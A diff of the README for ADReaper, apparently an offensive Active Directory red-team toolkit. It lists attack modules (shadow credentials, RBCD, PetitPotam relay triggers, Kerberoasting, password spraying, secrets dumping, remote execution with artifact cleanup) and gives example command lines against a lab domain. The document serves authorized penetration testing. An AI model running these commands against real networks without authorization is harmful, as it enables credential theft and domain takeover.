@@ -10,143 +10,108 @@
                                               @adreaper v3.2.0
 ```
 
-**ADReaper** is a high-performance, multi-threaded Active Directory reconnaissance and attack orchestration toolkit written in Go. Designed for Red Teams and Penetration Testers, it streamlines the discovery of attack vectors, privilege escalation paths, and sensitive information within complex AD environments.
+**ADReaper** is a high-performance, multi-threaded Active Directory reconnaissance and attack orchestration toolkit. It is designed to be the "Swiss Army Knife" for Red Teams, providing a unified interface for discovery, exploitation, and reporting.
 
 ---
 
-## 🚀 Core Features
+## 🚀 Core Capabilities
 
-### 🔍 Advanced Reconnaissance
-- **Intelligent LDAP Enumeration**: Deep object discovery (Users, Groups, Computers, GPOs, OUs) with focused metadata extraction.
-- **Global SMB Tree Mapping**: Recursive share discovery and file-level reconnaissance across the entire domain.
-- **Infrastructure Port Scanning**: High-speed, multi-threaded port scanner with service fingerprinting and Nmap-style `-Pn` support.
-- **DNS Recon**: Automated discovery of Domain Controllers, LDAP services, and network infrastructure via SRV records.
+### 🔍 Intelligence & Recon (Phase 1)
+- **Multi-Threaded Port Scanning**: High-speed discovery with service fingerprinting.
+- **LDAP Deep Enumeration**: Automated extraction of Users, Groups, OUs, and GPOs.
+- **Global SMB Mapping**: Recursive tree visualization of the entire domain's file shares.
+- **DNS Service Discovery**: Identification of internal infrastructure via SRV and A records.
 
-### ⚔️ Combat Modules (Attacks)
-- **Shadow Credentials**: Automate the creation of KeyCredentialLink attributes for passwordless authentication.
-- **RBCD Automation**: Full orchestration of Resource-Based Constrained Delegation attacks.
-- **NTLM Relay Triggers**: Built-in triggers for PetitPotam and PrinterBug to force authentication.
-- **Kerberoast & ASREPRoast**: Rapid extraction of service and user tickets for offline cracking.
-- **ACL Abuse Engine**: Discover and weaponize vulnerable Security Descriptors (GenericAll, WriteDacl, etc.).
-- **GPP Decryption**: Automated recovery of passwords from Group Policy Preferences.
+### 🩸 BloodHound Integration (Phase 2)
+ADReaper features a native **BloodHound Collector** that generates SharpHound-compatible JSON files for advanced graph analysis.
+- **Full Object Collection**: Users, Groups, Computers, and Containers.
+- **ACL Telemetry**: Real-time extraction of Security Descriptors to identify attack paths.
+- **Neo4j Direct Ingestion**: Push collected data directly into your BloodHound Neo4j database.
 
-### 🌌 Universal Remote Execution (Authentic Mode)
-- **Protocol-Level Relay**: Execute commands on remote targets via SMB/RPC without simulated mocks.
-- **Real-Time Output Polling**: Authentically captures STDOUT/STDERR from the target's filesystem via administrative shares.
-- **Stealth Cleanup**: Automatic removal of relay artifacts (`.bat` and output files) after execution.
+### ⚔️ Tactical Exploitation (Phase 3)
+- **Shadow Credentials**: Passwordless takeover via `msDS-KeyCredentialLink`.
+- **RBCD Automation**: Orchestrated Resource-Based Constrained Delegation.
+- **Credential Roasting**: High-speed Kerberoasting and ASREPRoasting.
+- **Relay Triggers**: Built-in PetitPotam and PrinterBug exploit engines.
+- **GPP Decryption**: Recover passwords from Group Policy Preferences.
+
+### 🌌 Universal Remote Execution (Phase 4)
+- **Authentic Protocol Relay**: Real command execution via SMB/RPC (No simulation).
+- **Real-Time Stream Capture**: Direct polling of remote STDOUT/STDERR.
+- **Zero-Footprint Cleanup**: Automatic removal of all remote artifacts.
 
 ---
 
-## 🛠️ Usage & Commands
+## 🛠️ Usage Guide
 
 ### 📋 Global Options
-| Flag | Description |
-| :--- | :--- |
-| `-d, --domain` | Target AD Domain (e.g., lab.local) |
-| `-u, --username` | Username for authentication |
-| `-p, --password` | Password for authentication |
-| `--dc-ip` | IP address of the Domain Controller |
-| `--smb-port` | Custom SMB port (default: 445) |
-| `-v, --verbose` | Enable verbose output logging |
+| Flag | Shorthand | Description |
+| :--- | :--- | :--- |
+| `--domain` | `-d` | Target AD Domain (lab.local) |
+| `--username` | `-u` | Authentication Username |
+| `--password` | `-p` | Authentication Password |
+| `--dc-ip` | | IP of the Domain Controller |
+| `--output` | `-o` | Workspace directory (Default: ./workspace) |
+| `--verbose` | `-v` | Enable detailed debug logging |
 
-### 🔍 Phase 1: Infrastructure & Recon
+### 🔍 Enumeration & Recon Examples
 ```powershell
-# High-speed port scan (All 65k ports) without ping (-Pn)
-.\adreaper.exe infra scan --all -Pn --dc-ip 192.168.3.10
+# Fingerprint the domain and password policy
+.\adreaper.exe enum domain -d lab.local --dc-ip 192.168.3.10
 
-# Domain fingerprinting (Functional levels, forest info, DCs)
-.\adreaper.exe enum domain --domain lab.local --dc-ip 192.168.3.10
+# Scan infrastructure (All ports, No-ping)
+.\adreaper.exe infra scan -t 192.168.3.10 --ports all -Pn
 
-# DNS Service discovery (Identify LDAP/GC/KDC servers)
-.\adreaper.exe infra dns --domain lab.local
+# Map the entire SMB tree of a target
+.\adreaper.exe enum tree -d lab.local -u user -p pass -s "C$" --depth 3
 ```
 
-### 👤 Phase 2: User & Group Intelligence
+### 🩸 BloodHound Operations
 ```powershell
-# List all domain users with detailed metadata
-.\adreaper.exe enum users --domain lab.local -u cgarcia -p 123456
+# Collect all domain data for BloodHound
+.\adreaper.exe bloodhound collect -d lab.local --dc-ip 192.168.3.10 -u admin -p pass
 
-# Find all members of "Domain Admins"
-.\adreaper.exe enum groups --name "Domain Admins" --domain lab.local
-
-# Check password policy (Max age, complexity, lockout)
-.\adreaper.exe enum policy --domain lab.local
+# Ingest data directly into Neo4j
+.\adreaper.exe bloodhound ingest --neo4j-uri bolt://127.0.0.1:7687 --neo4j-pass mypassword
 ```
 
-### 📂 Phase 3: SMB & Filesystem Recon
+### ⚔️ Attack & Exploitation Examples
 ```powershell
-# List all shares on a target computer
-.\adreaper.exe enum shares -t DC01 --domain lab.local
+# Password Spraying (Stealthy Throttling)
+.\adreaper.exe attack spray -U users.txt -P "Password123!" -d lab.local --delay 5
 
-# Recursive tree mapping of all shares (Global view)
-.\adreaper.exe enum tree --domain lab.local -u cgarcia -p 123456
+# Shadow Credentials Takeover
+.\adreaper.exe attack shadow -t SERVER01 -u user -p pass -d lab.local
 
-# Find sensitive files (.xml, .config, .txt) across the domain
-.\adreaper.exe attack harvest --exts xml,config,txt --domain lab.local
+# RBCD Impersonation
+.\adreaper.exe attack rbcd -t DC01 -M ATTACK_HOST$ -u admin -p pass
+
+# Kerberoast SPN Accounts
+.\adreaper.exe attack kerberoast -d lab.local -u user -p pass -o hashes.txt
 ```
 
-### ⚔️ Phase 4: Advanced Attack Orquestration
+### 🌌 Authentic Remote Execution
 ```powershell
-# Shadow Credentials (KeyCredentialLink Injection)
-.\adreaper.exe attack shadow -t SQL01 -u cgarcia -p 123456
+# Execute 'whoami /all' on a remote DC
+.\adreaper.exe "whoami /all" -d lab.local -u administrator -p Pass123 --dc-ip 192.168.3.10
 
-# GPP Password Decryption (Search SYSVOL for groups.xml)
-.\adreaper.exe attack gpp --domain lab.local
-
-# Kerberoasting (Extract service tickets for cracking)
-.\adreaper.exe attack kerberoast --domain lab.local -u cgarcia
-
-# ASREPRoasting (Extract user tickets without pre-auth)
-.\adreaper.exe attack asreproast --domain lab.local
-
-# Targeted Password Spraying
-.\adreaper.exe attack spray -u users.txt -p "Password123!" --domain lab.local
-
-# RBCD Automation (Resource-Based Constrained Delegation)
-.\adreaper.exe attack rbcd -t DC01 --impersonate Administrator
-
-# NTLM Relay Trigger (PetitPotam)
-.\adreaper.exe attack relay -t DC01 --listener 10.10.10.5
-
-# Secrets Dumping (SAM/LSA/DCSync simulation)
-.\adreaper.exe attack secrets -t DC01 --domain lab.local
-```
-
-### 🌌 Phase 5: Universal Remote Execution
-```powershell
-# Authentic 'whoami' with all privileges
-.\adreaper.exe "whoami /all" --domain lab.local -u administrator -p Pass123
-
-# Full system report via RPC/SMB relay
-.\adreaper.exe "systeminfo" --domain lab.local --dc-ip 192.168.3.10
-
-# List processes with real PID capture
-.\adreaper.exe "tasklist /v" --domain lab.local -u cgarcia -p 123456
+# Run 'systeminfo' and capture the real output
+.\adreaper.exe "systeminfo" -d lab.local -u admin -p pass
 ```
 
 ---
 
-## 📊 Revolutionary Reporting
-
-### Workspace Intelligence Dashboard (v3.0)
-ADReaper automatically generates a **Premium HTML Intelligence Dashboard**. It's not just a report; it's a command center:
-- **Auto-Artifact Discovery**: Automatically finds and embeds all JSON artifacts (BloodHound, Loot, Recon) from your workspace.
-- **Interactive JSON Viewer**: Browse complex data structures with a built-in, collapsible tree viewer.
-- **Dark Mode UI**: Professional, high-contrast design for long engagements.
-
----
-
-## 🏗️ Architecture
-
-- **`cmd/`**: CLI layer powered by Cobra. Handles command parsing and routing.
-- **`internal/recon/`**: The brain of the toolkit. Multi-threaded LDAP, SMB, and DNS engines.
-- **`internal/attacks/`**: Weaponized modules for privilege escalation and persistence.
-- **`internal/output/`**: Reporting engine supporting Table, JSON, and Premium HTML outputs.
+## 🏗️ Technical Architecture
+ADReaper is built with a modular approach for maximum stability:
+- **`cmd/`**: Cobra-based CLI interface with smart command proxying.
+- **`internal/recon/`**: Low-level protocol implementation (LDAP, SMB, DNS).
+- **`internal/attacks/`**: Weaponized modules with built-in safety checks.
+- **`internal/output/`**: High-performance reporting (Console, JSON, Premium HTML).
 
 ---
 
-## ⚠️ Disclaimer
-This tool is intended for legal, authorized security testing and educational purposes only. Unauthorized use of ADReaper against targets without prior written consent is strictly prohibited. The authors are not responsible for any misuse or damage caused by this program.
+## ⚠️ Tactical Warning
+This toolkit is designed for professional Red Team engagements. The use of remote execution modules and relay triggers against production servers should be done with extreme care. Always ensure you have written authorization before testing.
 
 ---
-**Developed with ❤️ for the Red Team Community.**
+**Developed with ❤️ and ⚔️ for the Global Red Team Community.**
